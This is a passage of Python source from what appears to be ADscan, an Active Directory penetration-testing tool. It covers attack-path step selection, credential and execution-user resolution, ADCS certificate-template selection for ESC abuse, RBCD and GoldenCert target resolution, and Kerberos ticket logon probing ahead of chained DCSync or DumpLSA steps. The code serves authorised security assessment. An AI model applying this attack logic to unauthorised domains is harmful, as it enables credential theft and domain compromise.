        default_option_idx = executable_indices.index(first_ready_idx)

    selection = shell._questionary_select(
        "Choose a custom start step:",
        options,
        default_idx=default_option_idx,
    )
    if selection is None:
        return None
    if selection >= len(executable_indices):
        return None

    chosen_step_idx = executable_indices[selection]
    chosen_ready, chosen_reason = readiness[selection]
    if (
        not chosen_ready
        and first_ready_idx is not None
        and first_ready_idx != chosen_step_idx
    ):
        print_warning(f"Step #{chosen_step_idx} is locked: {chosen_reason}.")
        choice = shell._questionary_select(
            "Preconditions are not met. What do you want to do?",
            [
                f"Start from Step #{first_ready_idx} instead (auto-resolve, recommended)",
                f"Run Step #{chosen_step_idx} anyway (override)",
                "Cancel execution",
            ],
            default_idx=0,
        )
        if choice is None or choice == 2:
            return None
        if choice == 0:
            return first_ready_idx
    elif not chosen_ready:
        # No ready step exists at all — let the user override but warn once.
        print_warning(
            f"Step #{chosen_step_idx} is locked: {chosen_reason}. "
            "Running anyway; expect failures if preconditions don't resolve at runtime."
        )
    return chosen_step_idx


def _find_next_attack_path_executable_step_index(
    executable_indices: list[int],
    current_step_index: int,
) -> int | None:
    """Return the next executable step index after one current step index."""
    for candidate in executable_indices:
        if candidate > current_step_index:
            return candidate
    return None


def _resolve_attack_path_step_password(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    context_username: str | None,
    context_password: str | None,
) -> str:
    """Resolve the password ADscan would use for one execution principal."""
    if not exec_username:
        return ""
    if (
        context_username
        and _normalize_account(context_username) == _normalize_account(exec_username)
        and context_password
    ):
        return str(context_password)
    return str(_resolve_domain_password(shell, domain, exec_username) or "")


def _attack_path_step_has_executable_context(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    step_index: int,
    context_username: str | None,
    context_password: str | None,
) -> bool:
    """Return whether ADscan could execute one step with the current context."""
    if step_index < 1 or step_index > len(steps):
        return False
    step_item = steps[step_index - 1]
    if not isinstance(step_item, dict):
        return False

    step_action = str(step_item.get("action") or "").strip()
    step_key = step_action.lower()
    step_details = (
        step_item.get("details") if isinstance(step_item.get("details"), dict) else {}
    )
    from_label = str(step_details.get("from") or "").strip()
    to_label = str(step_details.get("to") or "").strip()
    if not step_action:
        return False

    if step_key in ACL_ACE_RELATIONS:
        try:
            exec_context = build_ace_step_context(
                shell,
                domain,
                relation=step_action,
                summary=summary,
                from_label=from_label,
                to_label=to_label,
                context_username=context_username,
                context_password=context_password,
            )
        except Exception as exc:  # noqa: BLE001
            telemetry.capture_exception(exc)
            return False
        return bool(
            str(getattr(exec_context, "exec_username", "") or "").strip()
            and str(getattr(exec_context, "exec_password", "") or "").strip()
        )

    exec_username = _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )
    exec_password = _resolve_attack_path_step_password(
        shell,
        domain=domain,
        exec_username=exec_username or "",
        context_username=context_username,
        context_password=context_password,
    )
    if not exec_username or not exec_password:
        return False

    if step_key in {"adminto", "sqlaccess", "sqladmin", "canrdp", "canpsremote"}:
        return bool(
            to_label
            and resolve_netexec_target_for_node_label(
                shell,
                domain,
                node_label=to_label,
            )
        )
    if step_key == "allowedtodelegate":
        return bool(from_label and to_label)
    if step_key == "allowedtoact":
        # Target endpoint is the load-bearing requirement; the handler resolves
        # the owned SPN-bearing trustee member at execution time and reports a
        # precise failure when none is available.
        return bool(to_label)
    if step_key == "writelogonscript":
        domain_data = (
            getattr(shell, "domains_data", {}).get(domain, {})
            if isinstance(getattr(shell, "domains_data", None), dict)
            else {}
        )
        return bool(
            str(step_details.get("host") or "").strip()
            or _resolve_default_domain_controller(domain_data, domain)
        )
    return True


def _attack_path_processed_step_is_bypassable(
    shell: Any,
    *,
    domain: str,
    summary: dict[str, Any],
    steps: list[dict[str, Any]],
    executable_indices: list[int],
    step_index: int,
    step_status: str,
    context_username: str | None,
    context_password: str | None,
) -> bool:
    """Return whether one processed step can be skipped while continuing the path."""
    next_step_index = _find_next_attack_path_executable_step_index(
        executable_indices,
        step_index,
    )
    if next_step_index is None:
        return str(step_status or "").strip().lower() == "success"
    return _attack_path_step_has_executable_context(
        shell,
        domain=domain,
        summary=summary,
        steps=steps,
        step_index=next_step_index,
        context_username=context_username,
        context_password=context_password,
    )


def _resolve_attack_path_start_step(
    shell: Any,
    *,
    domain: str,
    steps: list[dict[str, Any]],
    executable_indices: list[int],
    non_executable_actions: set[str],
    dangerous_actions: set[str],
    summary: dict[str, Any],
    context_username: str | None = None,
    context_password: str | None = None,
) -> int | None:
    """Return selected start step index for attack path execution."""
    if not executable_indices:
        return None

    first_executable_idx = executable_indices[0]
    rerun_success_steps = _env_flag_enabled("ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS")
    if rerun_success_steps:
        print_info_verbose(
            "ADSCAN_ATTACK_PATH_RERUN_SUCCESS_STEPS enabled: re-running from step #1."
        )
        return first_executable_idx

    first_pending_idx: int | None = None
    first_execution_required_idx: int | None = None
    completed_steps = 0
    for step_idx, step_item in enumerate(steps, start=1):
        if not isinstance(step_item, dict):
            continue
        step_action = str(step_item.get("action") or "").strip().lower()
        if step_action in non_executable_actions:
            continue
        if step_action in dangerous_actions:
            continue
        step_status = str(step_item.get("status") or "discovered").strip().lower()
        if step_status == "success":
            if _attack_path_processed_step_is_bypassable(
                shell,
                domain=domain,
                summary=summary,
                steps=steps,
                executable_indices=executable_indices,
                step_index=step_idx,
                step_status=step_status,
                context_username=context_username,
                context_password=context_password,
            ):
                completed_steps += 1
                continue
            first_execution_required_idx = step_idx
            break
        if step_status == "attempted":
            if _attack_path_processed_step_is_bypassable(
                shell,
                domain=domain,
                summary=summary,
                steps=steps,
                executable_indices=executable_indices,
                step_index=step_idx,
                step_status=step_status,
                context_username=context_username,
                context_password=context_password,
            ):
                continue
            first_execution_required_idx = step_idx
            break
        first_execution_required_idx = step_idx
        if step_status in {"", "discovered", "theoretical"}:
            first_pending_idx = step_idx
            break

    domain_auth = (
        str(getattr(shell, "domains_data", {}).get(domain, {}).get("auth") or "")
        .strip()
        .lower()
    )
    domain_pwned = domain_auth == "pwned"

    default_start_idx = (
        first_execution_required_idx or first_pending_idx or first_executable_idx
    )
    non_interactive = is_non_interactive(shell)

    # --- Non-interactive: use computed default, skip if nothing to do ---
    if non_interactive:
        if domain_pwned and first_pending_idx is None:
            print_info_debug(
                "[attack_paths] no fresh steps remain for pwned domain; skipping path re-execution: "
                f"domain={mark_sensitive(domain, 'domain')}"
            )
            return None
        if first_execution_required_idx is None:
            return None
        return default_start_idx

    # --- Text-only fallback (no _questionary_select) ---
    if not hasattr(shell, "_questionary_select"):
        if domain_pwned and first_pending_idx is None:
            print_info(
                "No fresh executable steps remain in this attack path. "
                "Skipping re-execution because the domain is already compromised."
            )
            return (
                first_executable_idx
                if Confirm.ask(
                    "Re-run from the first step?",
                    default=False,
                )
                else None
            )
        if first_execution_required_idx is None:
            print_info(
                "All executable steps in this attack path are already marked as success."
            )
            return (
                first_executable_idx
                if Confirm.ask(
                    "All executable steps are already successful. Re-run from the first step?",
                    default=False,
                )
                else None
            )
        print_info(f"Starting execution from step #{default_start_idx}.")
        return default_start_idx

    # --- Interactive: always offer step selector with smart default ---

    # Edge case: no fresh steps — confirm before opening selector
    if domain_pwned and first_pending_idx is None:
        print_info(
            "No fresh executable steps remain in this attack path "
            "(domain is already compromised)."
        )
        choice = shell._questionary_select(
            "What do you want to do?",
            ["Skip execution (Recommended)", "Choose a step to re-run"],
            default_idx=0,
        )
        if choice is None or choice == 0:
            return None
        return _choose_custom_attack_path_start_step(
            shell,
            domain=domain,
            summary=summary,
            steps=steps,
            executable_indices=executable_indices,
            default_step_idx=first_executable_idx,
            context_username=context_username,
            context_password=context_password,
        )

    if first_execution_required_idx is None:
        print_info(
            "All executable steps in this attack path are already marked as success."
        )
        choice = shell._questionary_select(
            "What do you want to do?",
            ["Skip execution (Recommended)", "Choose a step to re-run"],
            default_idx=0,
        )
        if choice is None or choice == 0:
            return None
        return _choose_custom_attack_path_start_step(
            shell,
            domain=domain,
            summary=summary,
            steps=steps,
            executable_indices=executable_indices,
            default_step_idx=first_executable_idx,
            context_username=context_username,
            context_password=context_password,
        )

    # Normal case: show step selector directly with smart default pre-selected
    if len(executable_indices) == 1:
        return default_start_idx
    return _choose_custom_attack_path_start_step(
        shell,
        domain=domain,
        summary=summary,
        steps=steps,
        executable_indices=executable_indices,
        default_step_idx=default_start_idx,
        context_username=context_username,
        context_password=context_password,
    )


def _extract_cert_template_name_from_label(
    *,
    domain: str,
    to_label: str | None,
) -> str | None:
    """Best-effort extraction of a certificate template name from a step target label."""
    raw = str(to_label or "").strip()
    if not raw:
        return None
    if raw.strip().lower() == str(domain or "").strip().lower():
        return None
    if "\\" in raw:
        raw = raw.split("\\", 1)[1].strip()
    if "@" in raw:
        left, _, right = raw.partition("@")
        if right and right.strip().lower() == str(domain or "").strip().lower():
            raw = left.strip()
    return raw.strip() or None


def _extract_cert_templates_from_step_details(
    details: dict[str, Any],
    *,
    template_field: str = "template",
    list_field: str = "templates",
    summary_field: str = "templates_summary",
    include_vulnerable_resources: bool = True,
) -> list[str]:
    """Extract certificate template names from attack-step details.

    When *include_vulnerable_resources* is True (the default), the collector-
    populated vulnerable_resources list is checked first and returned as the
    authoritative source if it contains any CertTemplate entries.  Pass
    include_vulnerable_resources=False for role-scoped lookups (agent /
    target) where vulnerable_resources is not role-specific.
    """

    # Priority 1: collector-authoritative vulnerable_resources list.
    if include_vulnerable_resources:
        vr_list = details.get("vulnerable_resources")
        if isinstance(vr_list, list):
            vr_names: list[str] = []
            for entry in vr_list:
                if not isinstance(entry, dict):
                    continue
                kind = str(entry.get("kind") or "").strip().lower()
                if kind not in {"certtemplate", "certificatetemplate"}:
                    continue
                name = entry.get("name")
                if isinstance(name, str) and name.strip():
                    vr_names.append(name.strip())
            if vr_names:
                return sorted({n for n in vr_names}, key=str.lower)

    templates: list[str] = []

    template_name = details.get(template_field)
    if isinstance(template_name, str) and template_name.strip():
        templates.append(template_name.strip())

    raw_templates = details.get(list_field)
    if isinstance(raw_templates, list):
        for entry in raw_templates:
            name = None
            if isinstance(entry, dict):
                name = entry.get("name") or entry.get("template")
            elif isinstance(entry, str):
                name = entry
            if isinstance(name, str) and name.strip():
                templates.append(name.strip())

    summary = details.get(summary_field)
    if isinstance(summary, str) and summary.strip() and not raw_templates:
        for item in summary.split(","):
            candidate = item.strip()
            if not candidate or candidate.startswith("+"):
                continue
            if "(" in candidate:
                candidate = candidate.split("(", 1)[0].strip()
            if candidate:
                templates.append(candidate)

    if not templates:
        return []

    unique = sorted(
        {t for t in templates if isinstance(t, str) and t.strip()}, key=str.lower
    )
    return unique


def _extract_effective_group_from_step_details(details: dict[str, Any]) -> str | None:
    """Extract an effective group name from attack-step metadata."""
    candidate_keys = (
        "effective_group",
        "linked_group",
        "policy_group",
        "issuance_policy_group",
        "target_group",
        "group",
    )
    for key in candidate_keys:
        value = details.get(key)
        if isinstance(value, str) and value.strip():
            return value.strip()

    raw_groups = details.get("groups") or details.get("linked_groups")
    if isinstance(raw_groups, list):
        for item in raw_groups:
            if isinstance(item, str) and item.strip():
                return item.strip()
            if isinstance(item, dict):
                name = item.get("name") or item.get("group") or item.get("label")
                if isinstance(name, str) and name.strip():
                    return name.strip()

    templates = details.get("templates")
    if isinstance(templates, list):
        for item in templates:
            if not isinstance(item, dict):
                continue
            for key in candidate_keys:
                value = item.get(key)
                if isinstance(value, str) and value.strip():
                    return value.strip()
    return None


def _attack_path_label_to_name(label: str | None) -> str | None:
    """Return the SAM-like left side from an attack-path label."""
    raw = str(label or "").strip()
    if not raw:
        return None
    if "@" in raw:
        left, _, _ = raw.partition("@")
        return left.strip() or None
    return raw


def _extract_cert_templates_by_role(
    details: dict[str, Any],
    *,
    role: str,
) -> list[str]:
    """Extract role-specific certificate templates from attack-step details."""
    role_key = str(role or "").strip().lower()
    if role_key not in {"agent", "target"}:
        return []
    return _extract_cert_templates_from_step_details(
        details,
        template_field=f"{role_key}_template",
        list_field=f"{role_key}_templates",
        summary_field=f"{role_key}_templates_summary",
        include_vulnerable_resources=False,
    )


def _status_allowed_by_filter(status: str, desired_statuses: set[str] | None) -> bool:
    """Return True when status passes the optional execution filter."""
    if desired_statuses is None:
        return True
    return status in desired_statuses


def _select_adcs_template(
    shell: Any,
    *,
    esc_number: str,
    templates: list[str],
    default_idx: int = 0,
    prompt_label: str = "template",
) -> str | None:
    """Select a certificate template from candidates (prompt if needed)."""

    if not templates:
        return None

    template = templates[0]
    if len(templates) > 1 and hasattr(shell, "_questionary_select"):
        options = list(templates) + ["Cancel"]
        idx = shell._questionary_select(
            f"Select an ESC{esc_number} {prompt_label} to use:",
            options,
            default_idx=default_idx,
        )
        if idx is None or idx >= len(options) - 1:
            return None
        template = templates[idx]
    return template


def _resolve_adcs_template_candidates(
    shell: Any,
    *,
    domain: str,
    exec_username: str,
    password: str,
    esc_number: str,
    details: dict[str, Any],
    to_label: str | None,
    domain_data: dict[str, Any],
    allow_object_control: bool = False,
    allow_target_label_template: bool = True,
) -> list[str]:
    """Resolve certificate templates for an ADCS ESC step."""

    esc_tag = str(esc_number).strip()
    esc_templates = _extract_cert_templates_from_step_details(details)
    if esc_templates:
        from adscan_internal.cli.adcs_exploitation import _resolve_template_cn

        esc_templates = [_resolve_template_cn(shell, domain, t) for t in esc_templates]
        marked = ", ".join(mark_sensitive(t, "service") for t in esc_templates)
        print_info_debug(
            f"[adcsesc{esc_tag}] Using certificate template(s) from attack step details: "
            f"{marked}"
        )
        return esc_templates

    if allow_target_label_template:
        # Only treat the target label as a template name when the edge actually
        # targets a CertTemplate node.  For derived ESC edges the to_label is a
        # user or group — using it as a template name causes CA rejections.
        target_kind = str(details.get("target_kind") or "").strip().lower()
        if target_kind in {"certtemplate", "certificatetemplate"}:
            template_from_step = _extract_cert_template_name_from_label(
                domain=domain,
                to_label=to_label,
            )
            if template_from_step:
                from adscan_internal.cli.adcs_exploitation import _resolve_template_cn

                template_from_step = _resolve_template_cn(shell, domain, template_from_step)
                print_info_debug(
                    f"[adcsesc{esc_tag}] Using certificate template from attack step target: "
                    f"{mark_sensitive(template_from_step, 'service')}"
                )
                return [template_from_step]

    domain_dir = domain_data.get("dir")

    if allow_object_control:
        # Try native inventory first (ESC4 — template write access).
        if isinstance(domain_dir, str) and domain_dir:
            try:
                from adscan_internal.services.attack_graph_service import (
                    _attack_path_get_recursive_groups,
                    resolve_esc4_templates_from_inventory,
                )

                groups = _attack_path_get_recursive_groups(
                    shell, domain=domain, samaccountname=exec_username
                )
                inv_templates = resolve_esc4_templates_from_inventory(
                    domain_dir, username=exec_username, groups=groups
                )
                if inv_templates is not None:
                    print_info_verbose(
                        f"[ADCS] ESC4 templates from native inventory: {inv_templates or 'none'}"
                    )
                    if inv_templates:
                        return inv_templates
            except Exception as exc:  # noqa: BLE001
                telemetry.capture_exception(exc)

    return []


def _prompt_for_manual_adcs_template(
    *,
    esc_number: str,
    default: str | None = None,
) -> str | None:
    """Prompt the operator for a manual certificate template name."""

    if is_non_interactive():
        return None

    prompt_default = default or ""
    try:
        response = Prompt.ask(
            f"Enter an ESC{esc_number} certificate template name (blank to cancel)",
            default=prompt_default,
        )
    except Exception as exc:  # noqa: BLE001
        telemetry.capture_exception(exc)
        return None

    if not isinstance(response, str):
        return None
    response = response.strip()
    return response or None


def _resolve_execution_user(
    shell: Any,
    *,
    domain: str,
    context_username: str | None,
    summary: dict[str, object],
    from_label: str | None,
    host: str | None = None,
    max_options: int = 20,
) -> str | None:
    """Resolve an execution user for attack steps that require credentials.

    Pass ``host`` for a NETWORK-authenticating step (SMB/WinRM/RDP/MSSQL) so a
    principal already denied a network logon on that host is deprioritized in
    favour of a logon-capable one. Omit it for TGT/AS-REQ/scoped-ticket flows.
    """
    return _shared_resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
        host=host,
        max_options=max_options,
    )


def _resolve_golden_cert_execution_user(
    shell: Any,
    *,
    domain: str,
    context_username: str | None,
    summary: dict[str, object],
    from_label: str | None,
) -> str | None:
    """Resolve execution user for GoldenCert, preferring CA machine account creds."""
    domains_data = getattr(shell, "domains_data", None)
    domain_data = (
        domains_data.get(domain)
        if isinstance(domains_data, dict) and isinstance(domains_data.get(domain), dict)
        else {}
    )
    creds = domain_data.get("credentials") if isinstance(domain_data, dict) else {}
    if isinstance(creds, dict) and creds:
        from_user = _normalize_account(from_label or "")
        cred_keys = {str(k).lower(): str(k) for k in creds.keys()}
        if from_user.endswith("$") and from_user in cred_keys:
            selected = cred_keys[from_user]
            print_info_debug(
                "[goldencert] Using CA machine credential from step source: "
                f"{mark_sensitive(selected, 'user')}"
            )
            return selected

    return _resolve_execution_user(
        shell,
        domain=domain,
        context_username=context_username,
        summary=summary,
        from_label=from_label,
    )


def _resolve_golden_cert_target_host(
    shell: Any,
    *,
    domain: str,
    from_label: str | None,
    domain_data: dict[str, Any],
) -> str | None:
    """Resolve target CA host for GoldenCert."""
    if from_label:
        resolved = resolve_netexec_target_for_node_label(
            shell,
            domain,
            node_label=from_label,
        )
        if isinstance(resolved, str) and resolved.strip():
            return resolved.strip()

    adcs_host = domain_data.get("adcs")
    if isinstance(adcs_host, str) and adcs_host.strip():
        return adcs_host.strip()

    pdc_host = domain_data.get("pdc_hostname")
    if isinstance(pdc_host, str) and pdc_host.strip():
        return pdc_host.strip()
    return None


def _find_first_step(summary: dict[str, Any], *, action: str) -> dict[str, Any] | None:
    steps = summary.get("steps")
    if not isinstance(steps, list):
        return None
    needle = (action or "").strip().lower()
    for step in steps:
        if not isinstance(step, dict):
            continue
        if str(step.get("action") or "").strip().lower() != needle:
            continue
        return step
    return None


def _resolve_domain_password(shell: object, domain: str, username: str) -> str | None:
    domains_data = getattr(shell, "domains_data", None)
    if not isinstance(domains_data, dict):
        return None
    # Capability-bearing override (ESC13 PtC): prefer the marked ccache over a
    # stored password/hash for this user only when the marker is set.
    capability_ccache = get_capability_bearing_ccache(
        domains_data, domain=domain, username=username
    )
    if capability_ccache:
        return capability_ccache
    domain_data = domains_data.get(domain)
    if not isinstance(domain_data, dict):
        return None
    creds = domain_data.get("credentials")
    if not isinstance(creds, dict):
        return None
    value = creds.get(username)
    if not isinstance(value, str) or not value:
        return None
    return value


def _resolve_owned_spn_member_for_rbcd(
    shell: object, *, domain: str, trustee_label: str
) -> str | None:
    """Resolve an owned, SPN-bearing principal that is a member of the RBCD
    trustee (the grantee in the target's msDS-AllowedToActOnBehalfOfOtherIdentity).

    Computer accounts (sAMAccountName ending ``$``) always carry a host SPN
    usable as the S4U2Proxy delegating identity. The prior AddMember step in the
    chain places such a controlled account into the trustee group, so we prefer
    an owned computer account confirmed (incl. runtime adds) as a member of
    ``trustee_label``; when membership cannot be confirmed we fall back to the
    (usually single) owned computer account and let the S4U surface the precise
    DC rejection if it is not actually a member. Returns the sAMAccountName, or
    ``None`` when no owned computer account exists.
    """
    domain_data = (getattr(shell, "domains_data", {}) or {}).get(domain, {}) or {}
    creds = domain_data.get("credentials", {}) or {}
    owned_machines = sorted(
        {
            str(u).strip()
            for u in creds.keys()
            if isinstance(u, str) and str(u).strip().endswith("$") and len(str(u).strip()) > 1
        },
        key=str.lower,
    )
    if not owned_machines:
        return None
    owned_sams = {m.split("@", 1)[0].strip().lower() for m in owned_machines}
    trustee_sam = str(trustee_label or "").split("@", 1)[0].strip().lower()

    # Prefer a confirmed member of the trustee group (best-effort; includes the
    # runtime AddMember the previous step performed).
    try:
        from adscan_internal.services.attack_graph_service import (  # noqa: PLC0415
            _build_recursive_membership_closure,
            _load_membership_snapshot,
        )

        snapshot = _load_membership_snapshot(shell, domain)
        closure = (
            _build_recursive_membership_closure(domain, snapshot) if snapshot else {}
        )
        for principal_label, groups in (closure or {}).items():
            p_sam = str(principal_label).split("@", 1)[0].strip().lower()
            if p_sam not in owned_sams:
                continue
            if any(
                str(g).split("@", 1)[0].strip().lower() == trustee_sam
                for g in (groups or ())
            ):
                for machine in owned_machines:
                    if machine.split("@", 1)[0].strip().lower() == p_sam:
                        return machine
    except Exception as exc:  # noqa: BLE001 — membership confirmation is best-effort
        telemetry.capture_exception(exc)

    return owned_machines[0]


def _print_allowedtoact_blocked_panel(
    *, trustee_label: str, target_label: str, reason: str, next_step: str
) -> None:
    """Premium explanation of why an AllowedToAct (RBCD) step cannot run.

    The operator must understand the exploitation requirement, not just see a
    failure: RBCD needs a controlled SPN-bearing principal that is (or can be
    added as) a member of the trustee, AND whose long-term secret we hold (a
    ccache is not enough — the S4U2Self ticket has to be re-forged forwardable).
    """
    from adscan_internal.rich_output import print_panel  # noqa: PLC0415

    lines = [
        f"Target (RBCD):  {mark_sensitive(target_label or '?', 'node')}",
        f"Trustee:        {mark_sensitive(trustee_label or '?', 'node')}",
        "",
        f"Why it cannot run now:  {reason}",
        "",
        "Resource-based constrained delegation (AllowedToAct) is minted by a",
        "controlled principal that:",
        "  1. is — or can be added as — a member of the trustee above, and",
        "  2. has a Service Principal Name (computer accounts always do; a user",
        "     needs one, addable via WriteSPN when you control the account), and",
        "  3. whose long-term secret (password / NT hash) you hold — a ccache",
        "     alone is not enough: the S4U2Self ticket is re-forged forwardable",
        "     with the account key.",
        "",
        f"To unlock it:  {next_step}",
    ]
    print_panel(
        "\n".join(lines),
        title="🎫 AllowedToAct (RBCD) — cannot execute yet",
        border_style="yellow",
        expand=False,
    )


def _print_st_logon_denied_panel(
    *, principal: str, host: str, attempt: int, is_dc: bool
) -> None:
    """Premium card: a minted ST principal was denied a network logon → re-select.

    Recoverable (border yellow): the loop caches the denial and re-prompts. The
    operator must understand this is a User-Rights-Assignment hardening, not a
    missing privilege — and that the cached principal is now excluded everywhere.
    """
    from adscan_internal.rich_output import print_panel  # noqa: PLC0415

    masked_p = mark_sensitive(principal, "user")
    masked_h = mark_sensitive(host, "hostname")
    recovery = (
        "the DC machine account, which can always network-logon to itself, "
        "or another Domain Admin"
        if is_dc
        else "another privileged account permitted to log on to this host"
    )
    lines = [
        f"Host:       {masked_h}",
        f"Principal:  {masked_p}   (attempt {attempt})",
        "",
        "The target DENIED this principal a network logon",
        "(STATUS_LOGON_TYPE_NOT_GRANTED). This is a 'Deny access to this",
        "computer from the network' right (SeDenyNetworkLogonRight) in the",
        "host's User Rights Assignment / GPO — NOT a privilege the principal",
        "lacks, and NOT readable from any LDAP attribute, so it can only be",
        "learned by trying. The service ticket was minted fine; the host just",
        "refuses to honour it for a network logon.",
        "",
        f"Cached for {masked_h}:  {masked_p} will not be offered again here, in",
        "this or any other service-ticket flow.",
        "",
        f"Re-selecting now — choose {recovery}.",
    ]
    print_panel(
        "\n".join(lines),
        title="🚫 Network logon denied — re-selecting impersonation target",
        border_style="yellow",
        expand=False,
    )


def _print_st_logon_exhausted_panel(
    *, host: str, denied_principals: list[str], is_dc: bool
) -> None:
    """Premium card: every eligible principal was denied a network logon → halt.

    Terminal for this step (border red): the ST can be minted but never used on
    this host, so the chained DCSync/DumpLSA cannot run.
    """
    from adscan_internal.rich_output import print_panel  # noqa: PLC0415

    masked_h = mark_sensitive(host, "hostname")
    tried = "\n".join(
        f"  - {mark_sensitive(p, 'user')}" for p in denied_principals
    ) or "  (none selected)"
    next_step = (
        "compromise a principal the host's User Rights Assignment permits to "
        "log on (the host's own machine account always can), or target a "
        "different host"
    )
    lines = [
        f"Host:  {masked_h}",
        "",
        "Tried — all denied a network logon (SeDenyNetworkLogonRight):",
        tried,
        "",
        "Every eligible privileged principal was refused a network logon on",
        "this host. The service ticket can be minted but not used here, so the",
        "chained step (DCSync / DumpLSA) cannot run.",
        "",
        f"Next:  {next_step}.",
    ]
    print_panel(
        "\n".join(lines),
        title="⛔ No principal can authenticate to this host",
        border_style="red",
        expand=False,
    )


def _probe_ticket_network_logon(
    *, domain: str, target_ip: str, target_fqdn: str, kdc_ip: str, ccache_path: str
) -> tuple[bool, str | None]:
    """Cheap SMB session_setup probe: does this minted ticket grant a NETWORK
    logon to the target?

    Ground truth for the case an LDAP attribute cannot tell us: a principal may
    hold the privilege (e.g. replication) yet the target denies it a network
    logon (STATUS_LOGON_TYPE_NOT_GRANTED via SeDenyNetworkLogonRight). We detect
    it BEFORE chaining the consuming step. Returns ``(ok, status_text)``:
    ``(True, None)`` when a session is established; ``(False, <error>)`` on any
    auth/connect failure (the caller classifies whether it is a logon-type
    denial worth caching vs a transient error).
    """
    import asyncio  # noqa: PLC0415

    from adscan_internal.services.smb_transport import (  # noqa: PLC0415
        SMBConfig,
        smb_machine_for,
    )

    async def _run() -> tuple[bool, str | None]:
        cfg = SMBConfig(
            target_ip=target_ip,
            target_hostname=target_fqdn or None,
            domain=domain,
            kdc_ip=kdc_ip or target_ip,
            ccache_path=ccache_path,
            use_kerberos=True,
        )
        try:
            async with smb_machine_for(cfg):
                return True, None
        except Exception as exc:  # noqa: BLE001 — any failure is a non-ok probe
            return False, str(exc)

    try:
        return asyncio.run(_run())
    except Exception as exc:  # noqa: BLE001
        return False, str(exc)


def _resolve_workspace_dir(shell: Any, domain: str) -> str:
    """Return the workspace directory for a domain."""
    domain_data = getattr(shell, "domains_data", {}).get(domain, {})
    if isinstance(domain_data, dict):
        d = domain_data.get("dir") or ""
        if d:
            return str(d)
    return str(getattr(shell, "current_workspace_dir", "") or "")


def _resolve_ca_fqdn(domain_data: dict[str, Any]) -> str | None:
    """Resolve the CA FQDN from workspace data.

    Resolution order:
      1. Explicit adcs_fqdn written at collection time (first-class, always a hostname).
      2. adcs field when it contains an FQDN (legacy fallback for older workspaces).
    Returns None when neither source yields a usable hostname.
    """
    from adscan_internal.services._kerberos_spn import is_ip_address

    explicit = domain_data.get("adcs_fqdn")
    if (
        isinstance(explicit, str)
        and explicit.strip()
        and not is_ip_address(explicit.strip())
    ):
        return explicit.strip()

    adcs = domain_data.get("adcs")
    if isinstance(adcs, str):
        candidate = adcs.strip()
        if candidate and "." in candidate and not is_ip_address(candidate):
            return candidate
    return None


def _resolve_target_upn(to_label: str | None, domain: str) -> str:
    """Resolve the target UPN from the attack step's to_label."""
    label = str(to_label or "").strip()
    if "@" in label:
        return label.casefold()
    label_lower = label.casefold()
    if label_lower == domain.casefold() or label_lower.endswith(
        "." + domain.casefold()
    ):
        return f"administrator@{domain}"
    return f"{label}@{domain}"


def _resolve_esc9_puppet_user(details: dict[str, Any], domain: str) -> str | None:
    """Return the sAMAccountName of the puppet user for ESC9/10 from edge notes.

    The puppet user is the account whose UPN the attacker modifies during the
    ESC9/10 chain. It is stored in ``vulnerable_resources`` with ``role=puppet``
    when the precondition collector derived the edge correctly.
    """
    resources = details.get("vulnerable_resources") or []
    for res in resources:
        if not isinstance(res, dict):
            continue
        if str(res.get("kind") or "").lower() != "user":
            continue
        if str(res.get("role") or "").lower() != "puppet":
            continue
        name = str(res.get("name") or "").strip()
        if not name:
            continue
        # Strip realm suffix when present (name is stored as user@domain.local).
        if "@" in name:
            name = name.split("@", 1)[0]
        return name
    return None


def _resolve_esc9_puppet_dn(details: dict[str, Any]) -> str | None:
    """Return the LDAP distinguished name of the ESC9/10 puppet user from edge notes."""
    resources = details.get("vulnerable_resources") or []
    for res in resources:
        if not isinstance(res, dict):
            continue
        if str(res.get("kind") or "").lower() != "user":
            continue
        if str(res.get("role") or "").lower() != "puppet":
            continue
        dn = str(res.get("distinguished_name") or "").strip()
        if dn:
            return dn
    return None


def _resolve_default_domain_controller(
    domain_data: dict[str, Any], domain: str
) -> str | None:
    """Return the preferred DC target for SMB-backed execution helpers."""
    dc_fqdn = domain_data.get("pdc_hostname_fqdn") or domain_data.get("pdc_fqdn")
    if isinstance(dc_fqdn, str) and dc_fqdn.strip():
        return dc_fqdn.strip()
    pdc_hostname = str(domain_data.get("pdc_hostname") or "").strip()
    if pdc_hostname:
        return pdc_hostname if "." in pdc_hostname else f"{pdc_hostname}.{domain}"
    pdc_ip = str(domain_data.get("pdc") or "").strip()
    return pdc_ip or None


def _resolve_smb_spn_target(
    shell: Any,
    *,
    target_host: str,
    domain: str,
    domain_data: dict[str, Any],
) -> tuple[str, str | None]:
    """Resolve the Kerberos SPN host + KDC IP for an SMB-backed execution step.

    ``target_host`` may be a raw IP (lateral target reached by address only).
    Kerberos service tickets cannot bind to ``cifs/<ip>`` — route the host
    through the centralized :func:`resolve_spn_or_decide_ntlm` helper so the SPN
    host is an FQDN whenever one is recoverable. The KDC is ALWAYS the target
    domain's DC (``resolve_dc_ip``), NEVER the target host: pointing Kerberos at
    the member server makes it try to reach a KDC on port 88 of a non-KDC.

    Returns:
        ``(spn_host, kdc_ip)``. ``spn_host`` is the FQDN when resolvable, else
        the original ``target_host`` (the caller stays on NTLM in that case).
        ``kdc_ip`` is the domain DC IP, or ``None`` when unknown.
    """
    from adscan_internal.models.domain import resolve_dc_ip
    from adscan_internal.services.domain_controller_classifier import is_dc_host
    from adscan_internal.services.domain_posture import get_posture
    from adscan_internal.services.kerberos_spn_resolution import (
        resolve_spn_or_decide_ntlm,
    )

    domains_data = getattr(shell, "domains_data", None) or {}
    kdc_ip = None
    try:
        kdc_ip = resolve_dc_ip(domain_data or {})
    except Exception:  # noqa: BLE001
        kdc_ip = None

    inventory: dict | None = None
    workspace_dir = getattr(shell, "current_workspace_dir", None) or ""
    domains_dir = getattr(shell, "domains_dir", None) or ""
    if workspace_dir and domains_dir:
        try:
            from adscan_internal.services.kerberos_hostname_inventory import (
                load_workspace_ip_hostname_inventory,
            )

            inventory = (
                load_workspace_ip_hostname_inventory(
                    workspace_dir=workspace_dir,
                    domains_dir=domains_dir,
                    domain=domain,
                )
                or None
            )
        except Exception:  # noqa: BLE001 - inventory is best-effort
            inventory = None

    try:
